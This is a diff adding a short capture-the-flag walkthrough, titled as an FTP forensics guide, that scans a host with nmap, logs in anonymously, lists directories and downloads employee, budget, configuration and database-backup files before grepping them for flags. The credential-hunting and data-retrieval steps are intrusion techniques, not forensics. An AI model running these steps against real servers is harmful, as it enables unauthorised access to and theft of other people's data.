@@ -1,0 +1,30 @@
+FTP SERVER FORENSICS ANALYSIS GUIDE
+===================================
+
+STEP 1: Service Discovery
+nmap -sV -p 21 192.168.1.100
+
+STEP 2: Anonymous FTP Access
+ftp 192.168.1.100
+User: anonymous
+Password: (blank)
+
+STEP 3: Directory Enumeration
+ftp> ls -la
+ftp> cd corporate
+ftp> ls -la
+
+STEP 4: File Retrieval
+ftp> get employee_data.xlsx
+ftp> get budget_2024.pdf
+ftp> cd /system/config
+ftp> get ftp_config.conf
+
+STEP 5: Credential Discovery
+ftp> cd /system/backups
+ftp> get database_backup.sql
+
+STEP 6: Flag Extraction
+grep -r 'CTF{' downloaded_files/
+strings *.pdf | grep CTF
+cat ftp_config.conf | grep CTF
